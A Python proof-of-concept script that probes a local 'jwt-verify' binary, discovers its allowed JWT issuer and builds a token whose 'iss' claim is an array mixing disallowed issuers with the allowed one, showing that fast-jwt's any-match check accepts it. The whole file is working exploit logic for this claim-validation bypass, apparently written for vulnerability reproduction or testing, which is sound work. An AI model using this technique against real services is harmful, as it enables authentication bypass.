#!/usr/bin/env python3
"""PoC driver for the jwt-verify target: claim-validation weakness in issuer
allowlist checking (fast-jwt `allowedIss`).

Weakness demonstrated
---------------------
The target validates the JWT `iss` claim against a fixed allowlist of issuer
strings. Its verifier (fast-jwt) accepts the `iss` claim presented as a JSON
array of strings and then accepts the token if **any** element of the array
matches an allowed issuer. A strict, RFC 7519-conformant verifier rejects an
`iss` claim whose value is not a single StringOrURI, so the claim's value
form is itself invalid; moreover the delivered array contains issuer values
that the target's own allowlist policy does not permit. The crafted token:

  {"iss": ["https://iss.invalid/unallowed-a",
           "<allowed-issuer>",
           "https://iss.invalid/unallowed-b"]}

is accepted by the vulnerable target (any-match list semantics) but must be
rejected by a strict, specification-conformant verifier under the same claim
policy.

The script is a pure construct-and-report tool:

* it derives the verification secret at runtime,
* runs a small, bounded set of discovery probes against the target binary to
  determine the validated claim and its accepted value form,
* deterministically selects the final trigger token from the probe results,
* performs exactly one final verification run and reports the binary's own
  verdict JSON verbatim (accept or reject) in `observable.value`.

It never asserts, overrides, or fails on the observed verdict: a rejection
(e.g. by a fixed build) is reported as a normal result with `error: null`
and exit status 0.
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import signal
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# Deterministic runtime parameters (everything is derived locally at runtime;
# nothing is read from precomputed files or hardcoded absolute paths).
# ---------------------------------------------------------------------------

SECRET_MATERIAL = "poc-jwt-claim-validation-secret"  # HMAC key generated in-script
SECRET_FILE_PREFIX = "poc-jwt-key-"

# Candidate issuer strings used to discover the target's fixed issuer
# allowlist. The discovered allowed value is re-derived from the probes on
# every run; a static-inspection guess is only used as a fallback and is
# confirmed behaviorally before use.
ISS_CANDIDATES = [
    "https://valid-iss",
    "https://valid-issuer",
    "https://issuer.example.com",
    "https://auth.example.com",
    "https://issuer",
    "valid-iss",
    "issuer",
]

# Disallowed issuer values mixed into the final array-valued `iss` claim.
# "iss.invalid" is a reserved-invalid DNS name, so these cannot legitimately
# appear on any real issuer allowlist.
UNALLOWED_ISS_A = "https://iss.invalid/unallowed-a"
UNALLOWED_ISS_B = "https://iss.invalid/unallowed-b"

HEADER = {"alg": "HS256", "typ": "JWT"}
BASE_CLAIMS = {"sub": "poc-subject"}

MAX_CAPTURE = 1 << 20  # capture at most 1 MiB of stdout/stderr per run
OUT_VALUE_LIMIT = 65536  # truncate stored stdout/stderr beyond this


# ---------------------------------------------------------------------------
# JWT construction helpers (HS256, stdlib only).
# ---------------------------------------------------------------------------

def _b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def sign_hs256(payload, secret):
    header_b64 = _b64url(json.dumps(HEADER, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = ("%s.%s" % (header_b64, payload_b64)).encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return "%s.%s.%s" % (header_b64, payload_b64, _b64url(signature))


# ---------------------------------------------------------------------------
# Subprocess driver.
# ---------------------------------------------------------------------------

def run_binary(binary, token, key_arg, timeout):
    """Run the target once. Returns a result dict; never raises."""
    command = [binary, "--token", token, "--key", key_arg]
    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False,
        )
        timed_out = False
        returncode = proc.returncode
        sig_name = None
        if returncode is not None and returncode < 0:
            sig_name = signal.Signals(-returncode).name
        stdout = proc.stdout.decode("utf-8", "replace")
        stderr = proc.stderr.decode("utf-8", "replace")
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        returncode = None
        sig_name = None
        raw_out = exc.stdout if exc.stdout is not None else b""
        raw_err = exc.stderr if exc.stderr is not None else b""
        if isinstance(raw_out, str):
            raw_out = raw_out.encode("utf-8", "replace")
        if isinstance(raw_err, str):
            raw_err = raw_err.encode("utf-8", "replace")
        stdout = raw_out.decode("utf-8", "replace")
        stderr = raw_err.decode("utf-8", "replace")
    except Exception as exc:  # binary could not be started, etc.
        elapsed_ms = int(round((time.monotonic() - start) * 1000))
        return {
            "command": command,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "",
            "result": None,
            "error": "failed to run target binary: %s: %s" % (type(exc).__name__, exc),
        }
    elapsed_ms = int(round((time.monotonic() - start) * 1000))
    return {
        "command": command,
        "returncode": returncode,
        "signal": sig_name,
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout,
        "stderr": stderr,
        "result": extract_result_json(stdout),
        "error": None,
    }


def extract_result_json(stdout):
    """Extract the first complete JSON object from stdout, tolerating noise."""
    if not stdout:
        return None
    decoder = json.JSONDecoder()
    index = 0
    length = len(stdout)
    while index < length:
        start = stdout.find("{", index)
        if start == -1:
            break
        try:
            obj, _end = decoder.raw_decode(stdout[start:])
        except ValueError:
            index = start + 1
            continue
        if isinstance(obj, dict):
            return obj
        index = start + 1
    return None


# ---------------------------------------------------------------------------
# Discovery: determine the validated claim, the allowed issuer value, and the
# vulnerable value form (any-match array semantics for `iss`).
# ---------------------------------------------------------------------------

def discover_policy(binary, secret, key_arg, timeout):
    """Probe the target. Returns (report, final_token) or (report, None)."""
    report = {
        "probes": [],
        "iss_validated": None,
        "allowed_iss": None,
        "array_any_match_accepted": None,
        "array_all_bad_rejected": None,
        "selection": None,
    }

    def probe(name, claims, key_override=None):
        token = sign_hs256(claims, secret)
        run = run_binary(binary, token, key_override or key_arg, timeout)
        result = run["result"]
        entry = {
            "name": name,
            "claims": claims,
            "ok": result.get("ok") if isinstance(result, dict) else None,
            "error": run["error"],
            "timed_out": run["timed_out"],
        }
        if isinstance(result, dict) and result.get("ok") is False:
            err = result.get("error")
            if isinstance(err, dict):
                entry["code"] = err.get("code")
                entry["message"] = err.get("message")
        report["probes"].append(entry)
        return run

    def rejected_with_iss_value_error(run):
        result = run["result"]
        return (
            isinstance(result, dict)
            and result.get("ok") is False
            and isinstance(result.get("error"), dict)
            and "iss" in str(result["error"].get("message", ""))
        )

    def probe_iss_value(value):
        """Probe with a baseline claim set plus the given iss value."""
        claims = dict(BASE_CLAIMS)
        claims["iss"] = value
        return probe("iss=%r" % (value,), claims)

    # Probe 0: baseline without iss must be accepted, otherwise this build
    # does not match the expected target shape and discovery is impossible.
    baseline = probe("baseline (no iss)", dict(BASE_CLAIMS))
    baseline_result = baseline["result"]
    if not (isinstance(baseline_result, dict) and baseline_result.get("ok") is True):
        report["selection"] = "baseline probe was not accepted; cannot derive policy"
        return report, None

    # Probe 1: a clearly disallowed issuer must be rejected with an iss error,
    # confirming the target validates `iss` values.
    probe_iss_value(UNALLOWED_ISS_A)

    # Probe 2: behavioral search for the allowed issuer string.
    allowed_iss = None
    for candidate in ISS_CANDIDATES:
        run = probe_iss_value(candidate)
        result = run["result"]
        if isinstance(result, dict) and result.get("ok") is True:
            payload = result.get("payload")
            if isinstance(payload, dict) and payload.get("iss") == candidate:
                allowed_iss = candidate
                break

    # Fallback: static inspection of the binary for an embedded allowlist.
    # Any candidate found this way is still confirmed behaviorally above-style.
    if allowed_iss is None:
        for candidate in extract_allowed_iss_from_binary(binary):
            if candidate in ISS_CANDIDATES:
                continue
            run = probe_iss_value(candidate)
            result = run["result"]
            if isinstance(result, dict) and result.get("ok") is True:
                payload = result.get("payload")
                if isinstance(payload, dict) and payload.get("iss") == candidate:
                    allowed_iss = candidate
                    break

    if allowed_iss is None:
        report["iss_validated"] = True  # `iss` is validated, but allowlist unknown
        report["selection"] = "no allowed issuer value discovered; cannot build trigger"
        return report, None

    # Confirm `iss` validation precisely: allowed value accepted, disallowed
    # value rejected. (Both probes already ran; re-evaluate from report.)
    report["allowed_iss"] = allowed_iss
    report["iss_validated"] = True

    # Probe 3: array form containing only disallowed values must be rejected.
    bad_list_run = probe_iss_value([UNALLOWED_ISS_A, UNALLOWED_ISS_B])
    report["array_all_bad_rejected"] = rejected_with_iss_value_error(bad_list_run)

    # Probe 4: array form mixing disallowed values with the allowed one.
    mixed_claims = dict(BASE_CLAIMS)
    mixed_claims["iss"] = [UNALLOWED_ISS_A, allowed_iss, UNALLOWED_ISS_B]
    mixed_run = probe("iss=[bad, allowed, bad]", mixed_claims)
    mixed_result = mixed_run["result"]
    mixed_ok = isinstance(mixed_result, dict) and mixed_result.get("ok") is True
    report["array_any_match_accepted"] = mixed_ok

    # Selection: the final trigger token is the mixed array form. Selection is
    # deterministic and does not depend on the outcome of the final run.
    final_claims = {
        "sub": BASE_CLAIMS["sub"],
        "iss": [UNALLOWED_ISS_A, allowed_iss, UNALLOWED_ISS_B],
    }
    report["selection"] = (
        "iss claim as an array [unallowed, discovered-allowed, unallowed]: "
        "accepted by any-match list semantics, rejected by strict RFC 7519 "
        "verifiers (iss must be a single StringOrURI) and by the allowlist "
        "policy for the unallowed members"
    )
    return report, sign_hs256(final_claims, secret)


def extract_allowed_iss_from_binary(binary):
    """Statically scan the binary for an embedded issuer allowlist.

    Looks for the harness pattern: allowedIss: ["<issuer>", ...].
    Returns a list of candidate issuer strings (may be empty).
    """
    candidates = []
    try:
        with open(binary, "rb") as handle:
            data = handle.read()
    except OSError:
        return candidates
    text = data.decode("latin-1")
    for marker in ("allowedIss",):
        start = 0
        while True:
            pos = text.find(marker, start)
            if pos == -1:
                break
            start = pos + 1
            window = text[pos:pos + 512]
            strings = re_find_json_strings(window)
            for value in strings:
                if value and value not in candidates:
                    candidates.append(value)
    return candidates


def re_find_json_strings(text):
    """Extract JSON-style string literals from a text window (no re module
    dependency quirks; simple state machine)."""
    out = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] == '"':
            j = i + 1
            buf = []
            while j < n:
                ch = text[j]
                if ch == "\\" and j + 1 < n:
                    buf.append(text[j + 1])
                    j += 2
                    continue
                if ch == '"':
                    break
                buf.append(ch)
                j += 1
            if j < n and text[j] == '"':
                out.append("".join(buf))
                i = j + 1
                continue
        i += 1
    return out


# ---------------------------------------------------------------------------
# Output contract.
# ---------------------------------------------------------------------------

def build_report(binary, final_run, secret, discovery_report):
    result = final_run["result"]
    stdout = final_run["stdout"]
    stderr = final_run["stderr"]
    if len(stdout) > OUT_VALUE_LIMIT:
        stdout = stdout[:OUT_VALUE_LIMIT] + "...[truncated]"
    if len(stderr) > OUT_VALUE_LIMIT:
        stderr = stderr[:OUT_VALUE_LIMIT] + "...[truncated]"

    if final_run["error"] is not None:
        error = final_run["error"]
        observable_value = None
    elif final_run["timed_out"]:
        error = "target run exceeded the timeout"
        observable_value = None
    elif isinstance(result, dict):
        error = None
        # Report the binary's own verdict JSON exactly as printed.
        observable_value = json.dumps(result, separators=(",", ":"))
    else:
        error = "target produced no parseable result JSON on stdout"
        observable_value = None

    return {
        "binary": binary,
        "command": final_run["command"],
        "returncode": final_run["returncode"],
        "signal": final_run["signal"],
        "timed_out": final_run["timed_out"],
        "runtime_ms": final_run["runtime_ms"],
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": error,
        "discovery": discovery_report,
        "secret": secret,
    }


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Construct and deliver a JWT claim-validation trigger "
        "against the jwt-verify target, then report the run."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None,
                        help="write the JSON report to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="per-run timeout in seconds (default 30)")
    args = parser.parse_args(argv)

    # 1. Generate the verification secret inside the script at runtime.
    secret = SECRET_MATERIAL

    # 2-3. Discovery probes and deterministic selection of the trigger token.
    #      The secret is passed as a keyfile to avoid argv-splicing issues and
    #      to exercise the target's keyfile path; the file is created and
    #      removed by this script only.
    keyfile_path = os.path.join(
        tempfile.gettempdir(), "%s%d" % (SECRET_FILE_PREFIX, os.getpid())
    )
    discovery_report = None
    try:
        with open(keyfile_path, "w", encoding="utf-8") as handle:
            handle.write(secret)
        key_arg = keyfile_path

        if not os.path.isfile(args.binary):
            final_run = {
                "command": [args.binary],
                "returncode": None,
                "signal": None,
                "timed_out": False,
                "runtime_ms": 0,
                "stdout": "",
                "stderr": "",
                "result": None,
                "error": "binary not found: %s" % args.binary,
            }
            discovery_report = {"probes": [], "selection": None}
        else:
            discovery_report, final_token = discover_policy(
                args.binary, secret, key_arg, args.timeout
            )
            if final_token is None:
                final_run = {
                    "command": [args.binary],
                    "returncode": None,
                    "signal": None,
                    "timed_out": False,
                    "runtime_ms": 0,
                    "stdout": "",
                    "stderr": "",
                    "result": None,
                    "error": "could not derive a trigger token from discovery probes",
                }
            else:
                # 4. One final verification run with the chosen token.
                final_run = run_binary(args.binary, final_token, key_arg, args.timeout)
    except Exception as exc:  # pragma: no cover - defensive guard
        final_run = {
            "command": [args.binary],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "result": None,
            "error": "internal script error: %s: %s" % (type(exc).__name__, exc),
        }
        if discovery_report is None:
            discovery_report = {"probes": [], "selection": None}
    finally:
        try:
            if os.path.exists(keyfile_path):
                os.unlink(keyfile_path)
        except OSError:
            pass

    report = build_report(args.binary, final_run, secret, discovery_report)
    serialized = json.dumps(report, indent=2)

    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(serialized + "\n")
    else:
        sys.stdout.write(serialized + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
